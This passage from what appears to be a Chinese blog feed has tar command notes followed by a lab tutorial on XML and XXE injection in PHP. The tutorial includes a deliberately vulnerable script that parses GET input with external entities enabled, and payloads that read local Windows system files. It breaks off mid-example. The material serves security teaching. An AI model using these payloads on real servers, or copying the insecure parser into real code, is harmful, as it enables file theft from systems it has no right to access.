        <content type="html"><![CDATA[<p>附文：<a href="https://blog.csdn.net/qq_43657810/article/details/132328941">https://blog.csdn.net/qq_43657810/article/details/132328941</a></p><p><a href="https://blog.csdn.net/qq_16268979/article/details/127780124">https://blog.csdn.net/qq_16268979/article/details/127780124</a></p><p><strong>1、创建归档文件：</strong>将文件 file1、file2 和 directory 打包到一个名为 archive.tar 的归档文件中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cvf archive.tar file1 file2 directory</span><br></pre></td></tr></table></figure><ul><li><code>-c</code>: 创建新的归档文件</li><li><code>-v</code>: 显示详细输出，列出被添加到归档中的文件</li><li><code>-f</code>: 指定归档文件的名称</li></ul><p><strong>2、解压归档文件：</strong>解压名为 archive.tar 的归档文件，还原其中包含的文件和目录。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -xvf archive.tar</span><br></pre></td></tr></table></figure><ul><li><code>-x</code>: 解压归档文件</li><li><code>-v</code>: 显示详细输出，列出被解压的文件</li><li><code>-f</code>: 指定要解压的归档文件的名称</li></ul><p><strong>3、压缩归档文件：</strong>将名为 directory 的目录打包成一个归档文件，然后使用 gzip 进行压缩，生成名为 archive.tar.gz 的文件。</p><ul><li><code>-c</code>: 创建新的归档文件</li><li><code>-z</code>: 使用 gzip 压缩归档文件</li><li><code>-v</code>: 显示详细输出，列出被添加到归档中的文件</li><li><code>-f</code>: 指定归档文件的名称</li></ul><h3 id="指定压缩格式"><a href="#指定压缩格式" class="headerlink" title="指定压缩格式"></a>指定压缩格式</h3><p>tar 可以结合不同的压缩程序来创建和解压压缩归档文件。</p><p><strong>z</strong> : 使用 gzip 压缩。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -czvf archive.tar.gz directory</span><br><span class="line">tar -xzvf archive.tar.gz</span><br></pre></td></tr></table></figure><p><strong>j</strong>: 使用 bzip2 压缩。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cjvf archive.tar.bz2 directory</span><br><span class="line">tar -xjvf archive.tar.bz2</span><br></pre></td></tr></table></figure><p><strong>J</strong>: 使用 xz 压缩。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cJvf archive.tar.xz directory</span><br><span class="line">tar -xJvf archive.tar.xz</span><br></pre></td></tr></table></figure><p>补充：</p><p>有一堆文件来自两个tar文件，怎么单独删除来自某个文件的解压文件，可以利用xargs</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost tar_test]$ tar -tvf odd.tar</span><br><span class="line">-rw-rw-r-- youzipii/youzipii 10240 2024-05-30 20:53 file1</span><br><span class="line">-rw-rw-r-- youzipii/youzipii     0 2024-05-30 20:26 file3</span><br><span class="line">-rw-rw-r-- youzipii/youzipii     0 2024-05-30 20:26 file5</span><br><span class="line">[youzipii@localhost tar_test]$ tar -tvf even.tar</span><br><span class="line">-rw-rw-r-- youzipii/youzipii 0 2024-05-30 20:58 file0</span><br><span class="line">-rw-rw-r-- youzipii/youzipii 0 2024-05-30 20:58 file2</span><br><span class="line">-rw-rw-r-- youzipii/youzipii 0 2024-05-30 20:58 file4</span><br><span class="line">[youzipii@localhost tar_test]$ ls</span><br><span class="line">even.tar  file0  file1  file2  file3  file4  file5  odd.tar</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -tf odd.tar | xargs rm -f</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的xml外部实体注入</title>
      <link href="/2024/05/30/PHP%E7%9A%84xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/05/30/PHP%E7%9A%84xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="php的xml外部实体注入"><a href="#php的xml外部实体注入" class="headerlink" title="php的xml外部实体注入"></a>php的xml外部实体注入</h1><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>、 <a href="https://www.php.net/manual/zh/function.copy.php">copy()</a>、 <a href="https://www.php.net/manual/zh/function.file-exists.php">file_exists()</a> 和 <a href="https://www.php.net/manual/zh/function.filesize.php">filesize()</a> 的文件系统函数。 除了这些封装协议，还能通过 <a href="https://www.php.net/manual/zh/function.stream-wrapper-register.php">stream_wrapper_register()</a> 来注册自定义的封装协议。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><p>想要了解更详细的信息，可以访问php的官方文档：</p><p><a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a><strong>什么是XML</strong></h2><p>eXtensible Markup Language,可扩展标记语言，使用简单的标记来描述数据。是一种非常灵活的语言,类似于HTML语言，但是并没有固定的标签，所有的标签都可以自定义，其设计的宗旨是传输数据，而不是像HTML一样显示数据。xml不会做任何事情，它是被设计用来结构化、存储以及传输信息，也就是xml文件所携带的信息，需要被其他的语言或者程序来解析，才能发挥作用。</p><h2 id="XML的用处"><a href="#XML的用处" class="headerlink" title="XML的用处"></a><strong>XML的用处</strong></h2><p>通常，xml被用于信息的记录和传递(比如，数据库的导出导入会很麻烦，但是xml会很方便)，也会被用于充当配置文件。也会被应用于Web 开发的许多方面，常用于简化数据的存储和共享。如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&gt; XML 把数据从 HTML 分离，更方便再HTML文档中显示动态数据。</span><br><span class="line">b&gt; XML 简化数据共享，XML 数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。这让创建不同应用程序可以共享的数据变得更加容易。</span><br><span class="line">c&gt; XML 简化数据传输，由于可以通过各种不兼容的应用程序来读取数据，以 XML 交换数据降低了不兼容系统之间交换书据的复杂性。</span><br><span class="line">d&gt; XML 简化平台变更，使用XML存储一些不兼容的数据，可以在系统或软件升级，转换大量的数据时，避免数据的丢失。</span><br><span class="line">e&gt; XML 使您的数据更有用，XML可以使不同的应用程序都能够访问您的数据，使得数据的用途更广。</span><br><span class="line">f&gt; XML 用于创建新的互联网语言，如XHTML、WSDL、WAP 和 WML、RSS 、RDF 和 OWL等</span><br></pre></td></tr></table></figure><h2 id="什么是XML注入"><a href="#什么是XML注入" class="headerlink" title="什么是XML注入"></a><strong>什么是XML注入</strong></h2><p>比如：一个 web 应用，使用进行用户注册时，选择以 xml 来存储数据到 xmldb 数据库中，当用户填写用户名，密码和邮箱时，后台存储的文件格式及内容如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding:=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user_name</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user_name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user_pass</span>&gt;</span>111111<span class="tag">&lt;/<span class="name">user_pass</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user_email</span>&gt;</span>admin@test.com<span class="tag">&lt;/<span class="name">user_email</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么攻击者就可以在注册的时候构造恶意的数据，假设他在用户名与密码的输入框中输入正常的文本，在最后的邮箱输入框中输入如下内容：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">user_email</span>&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">user_name</span>&gt;</span>admin1<span class="tag">&lt;/<span class="name">user_name</span>&gt;</span><span class="tag">&lt;<span class="name">user_pass</span>&gt;</span>111111<span class="tag">&lt;/<span class="name">user_pass</span>&gt;</span><span class="tag">&lt;<span class="name">user_email</span>&gt;</span>admin1@test.com<span class="tag">&lt;/<span class="name">user_email</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们看一看这段恶意的输入内容，先是把第一个注册的用户邮箱标签闭合，然后把用户标签闭合，再新建一个完整的用户标签，最后再把最后的没有任何内容的用户标签闭合，那么当这段内容到达xmldb数据中时，就会多注册一个名为admin1的用户。</p><p>综合上面的小例子，我么可以知道,能够进行XML注入攻击的前提是，用户能够控制数据的输入，程序没有对输入的内容进行过滤且拼接了数据。那么相应的，破坏掉其中一个前提就可以进行防御了，既然我们无法限制用户的输入，那么就可以对数据进行过滤，将XML语言本身的“保留字符”进行过滤或者转意即可。</p><h2 id="什么是XXE注入漏洞："><a href="#什么是XXE注入漏洞：" class="headerlink" title="什么是XXE注入漏洞："></a><strong>什么是XXE注入漏洞：</strong></h2><p>XXE注入也是XML注入的一部分，但相较于普通的XML注入，XXE注入的攻击面更广，危害更大。</p><p><strong>XXE注入</strong>(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，所注入的对象就是XML语言中的一个的重点： XML外部实体。当遇见能够解析XML内容的页面时，如果能注入外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面。</p><p>XXE的攻击形式主要分为：带内数据实体注入、基于错误的实体注入和带外数据实体注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">带内数据实体注入：in-band ,XML解析后的数据会直接显示在屏幕上</span><br><span class="line">基于错误的实体注入：error-based，解析结果只有一大堆的错误</span><br><span class="line">带外数据实体注入：out-of-band，也叫XXE盲注，注入的XML解析后无任何输出响应，必须执行一些带外请求吧数据提取出来。</span><br></pre></td></tr></table></figure><h2 id="XXE注入能做什么："><a href="#XXE注入能做什么：" class="headerlink" title="XXE注入能做什么："></a><strong>XXE注入能做什么：</strong></h2><p>a&gt; 任意文件读（本实验重点）</p><p>b&gt; SSRF，服务端请求伪造，借助漏洞实现内网探测，比如内网的存活主机、开放端口等</p><p>c&gt; DOS攻击</p><p>d&gt; 远程命令执行</p><h2 id="PHP的XXE注入产生的条件"><a href="#PHP的XXE注入产生的条件" class="headerlink" title="PHP的XXE注入产生的条件"></a><strong>PHP的XXE注入产生的条件</strong></h2><p>a&gt; Libxml的版本尽可能的低，libxml是PHP的xml解析库，因为从2.8.0版本开始，libxml默认是不加载外部实体的，如果要使用较高版本的libxml的话，需要在编写代码的时候对参数做设置。</p><p>b&gt; 目标主机没有禁用外部实体的引用。</p><p>c&gt; 用户可以控制xml的输入内容</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>系统类型： Windows7_x64</p><p>IP地址： 192.168.0.3</p><p>所用软件： phpstudy、BurpSuite、ncat</p><p>实验内容主要分为四个部分：</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>1． XML基础必备</p><p>2． 有回显的本地文件读取（In-band 带内数据实体注入）。</p><p>3． 无回显的本地文件读取（OOB out-of-band 外带参数实体注入）。</p><p>4． PHP中的XXE注入漏洞的其他利用方式</p><h3 id="XML基础必备"><a href="#XML基础必备" class="headerlink" title="XML基础必备"></a>XML基础必备</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding:=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user_name</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user_name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user_pass</span>&gt;</span>111111<span class="tag">&lt;/<span class="name">user_pass</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user_email</span>&gt;</span>admin@test.com<span class="tag">&lt;/<span class="name">user_email</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如上代码，第一行是XML文档的声明，由“<?xml”开头，以“?>”结尾，其中的内容是对本xml文档所使用的版本 “version”和编码“encoding”的声明，version一般情况下都是1.0，因为目前为止，xml只有这一个版本。</p><p>从第三行开始，就是XML文档的主要内容了，如代码中所示的“<Users>”，是本文档的根元素，“<user>”是“<Users>”的子元素，而“<user_name>、<user_pass>、<user_email>”也都是子元素，但是是“<book>”的子元素。</p><h4 id="XML的格式"><a href="#XML的格式" class="headerlink" title="XML的格式"></a><strong>XML的格式</strong></h4><p>a&gt;. 声明信息，用于描述xml的版本及编码格式。**<?**xml version="1.0" encoding="utf-8" **?>**</p><p>b&gt;. xml有且仅有一个根元素（可以理解为顶级的元素、没有被其他元素包起来的元素）。</p><p>c&gt;. xml中大小写敏感</p><p>d&gt;. 标签是成对出现的，所有元素都必须有一个关闭标签，而且要正确嵌套。</p><p>e&gt;. 属性值要使用双引号,比如某标签有个id属性，那么id的值需要使用双引号</p><p>f&gt;. 注释的写法。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--1--&gt;</span></span><br></pre></td></tr></table></figure><p>g&gt;. 一个格式良好的xml文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;books&gt;</span><br><span class="line">    &lt;book id=&quot;b01&quot;&gt;</span><br><span class="line">        &lt;name&gt;Python黑客编程从入门到入狱&lt;/name&gt;</span><br><span class="line">        &lt;author&gt;张三&lt;/author&gt;</span><br><span class="line">        &lt;price&gt;$20.00&lt;/price&gt;</span><br><span class="line">    &lt;/book&gt;</span><br><span class="line">&lt;/books&gt;</span><br></pre></td></tr></table></figure><p>h&gt;. XML并不是让用户直接打开的，而是让别的语言来从文件中读取信息的。至于为什么可以直接用浏览器浏览，只是部分浏览器可以识别而已。</p><h4 id="XML的属性"><a href="#XML的属性" class="headerlink" title="XML的属性"></a><strong>XML的属性</strong></h4><p>虽然XML像HTML一样，也有属性，但是一般不推荐使用属性，如果某个信息看起来很像是数据，那么最好是使用元素来表示它，而不是属性。</p><h4 id="XML验证"><a href="#XML验证" class="headerlink" title="XML验证"></a><strong>XML验证</strong></h4><p>拥有正确语法的 XML 被称为”形式良好”的 XML。而判断XML的语法是否合法，叫做XML验证，是通过 DTD进行验证的。</p><p>DTD：Document Type Definition 文档类型定义。用于约束xml的文档格式，保证xml是一个有效的xml，DTD分为内部和外部两种。DTD定义在xml文件中视为内部DTD；DTD定义在外部的dtd文件中，视为外部DTD。</p><p>说的简单一点，DTD就是对当前的XML文档定义一些规则，比如这个XML文档中的根元素是什么，有几个子元素，每个子元素能出现几次，哪些元素有属性，属性的类型是什么，属性的默认值是什么等等，如果后面的XML内容中，与DTD中的定以不符，如元素个数不符、元素名称大小写不符等，那么XML文件解析时就会报错。</p><h4 id="内部DTD的使用："><a href="#内部DTD的使用：" class="headerlink" title="内部DTD的使用："></a><strong>内部DTD的使用：</strong></h4><h5 id="内部DTD的定义"><a href="#内部DTD的定义" class="headerlink" title="内部DTD的定义"></a><strong>内部DTD的定义</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><h5 id="元素声明语法"><a href="#元素声明语法" class="headerlink" title="元素声明语法"></a><strong>元素声明语法</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">&lt;!ELEMENT 根元素 (子元素)&gt;</span><br><span class="line">&lt;!ELEMENT 根元素的子元素 (子元素的子元素，子元素的子元素)&gt;</span><br><span class="line">&lt;!ELEMENT 子元素 (数据类型)&gt;</span><br><span class="line">&lt;!ELEMENT 子元素 (数据类型)&gt;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h5 id="元素声明中的数量词"><a href="#元素声明中的数量词" class="headerlink" title="元素声明中的数量词"></a><strong>元素声明中的数量词</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;+&quot; 表示出现一次或者多次</span><br><span class="line">&quot;?&quot;表示出现0次或多次</span><br><span class="line">&quot;*&quot;表示出现任意次。</span><br></pre></td></tr></table></figure><h5 id="属性声明语法"><a href="#属性声明语法" class="headerlink" title="属性声明语法"></a><strong>属性声明语法</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称  属性类型 默认值&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!--注释--&gt;</span><br><span class="line">&lt;!DOCTYPE books [</span><br><span class="line">&lt;!ELEMENT books (book+)&gt;</span><br><span class="line">&lt;!ELEMENT book (name,author price)&gt;</span><br><span class="line">&lt;!ATTLIST book id CDATA #REQUIRED&gt;</span><br><span class="line">&lt;!ELEMENT name (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT author (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT price (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;books&gt;</span><br><span class="line">&lt;book id=&quot;b01&quot;&gt;</span><br><span class="line">    &lt;name&gt;a&lt;/name&gt;</span><br><span class="line">        &lt;author&gt;张三&lt;/author&gt;</span><br><span class="line">        &lt;price&gt;$1.00&lt;/price&gt;</span><br><span class="line">    &lt;/book&gt;</span><br><span class="line">&lt;/books&gt;</span><br></pre></td></tr></table></figure><p>如上，就是一个内部DTD的引用示例，在DTD定义中，要求根元素books的子元素book出现一次及以上，子元素book又有三个子元素，分别为name，author和price，然后声明了元素book的id属性，其类型时CDATA，并且是必须的（#REQUIRED），最后定义了book的三个子元素的数据类型为#PCDATA，这表示这三个元素标签中的内容必须为文本，不能再出现子标签。</p><h4 id="外部DTD的使用："><a href="#外部DTD的使用：" class="headerlink" title="外部DTD的使用："></a><strong>外部DTD的使用：</strong></h4><p>首先需要创建一个外部的dtd文件。内容中不需要包括&lt;!DOCTYPE…&gt;，直接&lt;!ELEMENT…&gt;，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ELEMENT books (book+)&gt;</span><br><span class="line">&lt;!ELEMENT book ( name,author,price)&gt;</span><br><span class="line">&lt;!ATTLIST book id CDATA #REQUIRED&gt;</span><br><span class="line">&lt;!ELEMENT name (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT author (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT price (#PCDATA)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在XML文档中引入外部的DTD：</p><!DOCTYPE books SYSTEM "xxx.dtd"><p>注意外部实体引用时的关键字“SYSTEM”，同时也可以使用“PUBLIC”这个关键字，这两者的区别在于，SYSTEM表示私有的DTD，PUBLIC表示共有的DTD。</p><h4 id="DTD实体（重点学习）"><a href="#DTD实体（重点学习）" class="headerlink" title="DTD实体（重点学习）"></a><strong>DTD实体（重点学习）</strong></h4><p>首先，什么是DTD实体，简单点理解，实体就像是变量，可以用于存储数据，以便后续的使用。但它的功能又不仅仅是存储，比如外部实体，除了可以存储数据，还可以从远程文件或远程网络中读取内容或调用数据。</p><p>从实体被定义的位置来看，实体可以分为内部实体和外部实体，就像内部DTD和外部DTD一样，内部实体，就是在XML文档内部的DTD进行定义的实体，外部实体就是定义在外部DTD文件中然后被引用到当前XML中的实体。</p><p><strong>内部实体声明：</strong></p><p><strong>声明语法：</strong></p><!ENTITY 实体名称 "实体的值"><p>一个实体的引用，由三部分构成:&amp;符号, 实体名称, 分号。</p><p><strong>内部实体引用示例：</strong></p><p>我们可以在桌面上创建一个test.xml文件，将如下内容输入到文件中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Test [</span><br><span class="line">&lt;!ENTITY test &quot;Hello World&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;Test&gt;&amp;test;&lt;/Test&gt;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240530102946971.png" alt="image-20240530102946971"></p><p>接下来我们使用PHP进行解析：</p><p>打开phpstudy的www目录,然后在该路径下新建一个php文件getxml.php（实验环境中已经创建好，在桌面demo&#x2F;PHP_XML&#x2F;step1下，getxml.php），将如下代码输入进去：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xml&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$xml</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用浏览器进行访问getxml.php.直接访问可能会有报错，可能是因为我们还没有输入参数,然后我们将将前面的xml代码作为参数传入，可以不复制xml声明，<strong>记得要将引用实体时的“&amp;”手动编码为“%26”</strong>（因为我们这里使用的是GET传参的方式，所以传入的内容会被进行URL编码，但是&amp;在URL中被认为是两个参数的分隔符，所以如果我们不对其进行URL编码转换，浏览器会把它当作参数的分隔符来处理）：</p><p><img src="/../image/image-20240530103234742.png" alt="image-20240530103234742"></p><p><strong>外部实体声明：</strong></p><p><strong>声明语法：</strong></p><!ENTITY 实体名称 SYSTEM "URI/URL"><p>声明一个外部实体的关键在于“SYSTEM”这个关键字。SYSTEM在此意图让xml解析器知道，现在声明的是一个外部实体，需要从后面的外部资源中获取内容并存储在内部实体，如果后面的外部资源的语法，存在特殊符号，那么xml解析器会报错。</p><p>外部实体引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，比如http、file、ftp等，具体内容如下所示：</p><p><img src="/../image/image-20240530103307148.png" alt="image-20240530103307148"></p><p><strong>外部实体引用示例：</strong></p><p>实验环境中已经创建好以下文件，在桌面demo&#x2F;PHP_XML&#x2F;step1下，test2.xml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.3/out_test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;Test&gt;&amp;xxe;&lt;/Test&gt;</span><br></pre></td></tr></table></figure><p>我们可以看到，代码中引入了一个外部实体文件out_test.txt，意思就是将远程主机“<a href="http://192.168.0.3/%E2%80%9D%E7%9A%84out_test.txt%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E8%B5%8B%E5%80%BC%E7%BB%99%E5%AE%9E%E4%BD%93xxe%E3%80%82%E6%88%91%E4%BB%AC%E5%85%88%E5%9C%A8www%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAout_test.txt,%E5%90%8E%E9%9A%8F%E4%BE%BF%E5%86%99%E5%85%A5%E7%82%B9%E5%86%85%E5%AE%B9%E3%80%82">http://192.168.0.3/”的out_test.txt的文件内容赋值给实体xxe。我们先在www目录下创建一个out_test.txt,后随便写入点内容。</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this is a text</span><br></pre></td></tr></table></figure><p>再次打开浏览器，访问getxml.php,将新的xml代码作为参数传入：</p><p><img src="/../image/image-20240530103454208.png" alt="image-20240530103454208"></p><p>另外，从实体的引用方式来区分，实体又可以分为：一般实体、参数实体、预定义实体。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一般实体：General Entities，就是我们上面的示例中的实体，使用&amp;进行引用</span><br><span class="line"></span><br><span class="line">预定义实体：Predefined Entities，就是xml本身对一些特殊字符进行了预定义，方便用户直接引用，比如小于号&quot;&lt;&quot;，如果直接在xml文档中使用小于号，会被xml解析器视为标签，从而引起解析错误。那么此时就需要调用小于号所对应的预定义实体来引用：&lt;。</span><br><span class="line"></span><br><span class="line">参数实体：Parameter Entities，这也是XXE学习中的重点，在XXE利用中经常被使用。</span><br></pre></td></tr></table></figure><p><strong>参数实体</strong></p><p><strong>参数实体声明：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内部：&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;</span><br><span class="line">外部：&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>参数实体应注意以下几点：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 “%实体名;” 引用</span><br><span class="line">(2) 只有在 DTD 文件中，参数实体的声明才能引用其他实体</span><br><span class="line">(3) 和通用实体一样，参数实体也可以外部引用</span><br></pre></td></tr></table></figure><p>简单理解呢，就是参数实体不能像普通实体那样在xml文档内容中进行引用，它的引用范围只在当前xml文件的DTD声明中，或者是当前的DTD文件中。</p><p>参数实体引用示例（实验环境中已经创建好，在桌面demo&#x2F;PHP_XML&#x2F;step1下，test3.xml）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!-- 参数实体 --&gt;</span><br><span class="line">&lt;!DOCTYPE Test [</span><br><span class="line">&lt;!ENTITY  % par &quot;&lt;!ENTITY hello &#x27;hello para entities&#x27;&gt;&quot;&gt;</span><br><span class="line">%par;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;Test&gt;&amp;hello;&lt;/Test&gt;</span><br></pre></td></tr></table></figure><p>像上图这样一个xml文档，我们定义了一个参数实体为par，他的值比较特殊，是一句普通实体的声明，然后是在DTD中使用“%par;”进行引用，最后在xml文档内容中使用“&amp;hello”来引用定义的普通实体hello。所以这个时候，我们直接使用浏览器查看的时候，会是下面的显示：</p><p><img src="/../image/image-20240530111305856.png" alt="image-20240530111305856"></p><p>我们还是使用之前的getxml.php：</p><p>测试用的payload，也就是我们所要传的参数（记得在浏览器传参时将&amp;转义为%26）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>这是利用file协议来直接读取windows的系统配置文件，结果为：</p><p><img src="/../image/image-20240530112335516.png" alt="image-20240530112335516"></p><p>但是这样也不代表这个payload的就适用于任何情况，比如我们更换一个读取的文件xmlerror.txt，内容是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;this is a test&gt;&amp;&lt;##</span><br></pre></td></tr></table></figure><p>随便给他放个位置，我这里放在桌面上，我们再使用刚才的payload测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>随便给他放个位置，我这里放在桌面上，我们再使用刚才的payload测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span 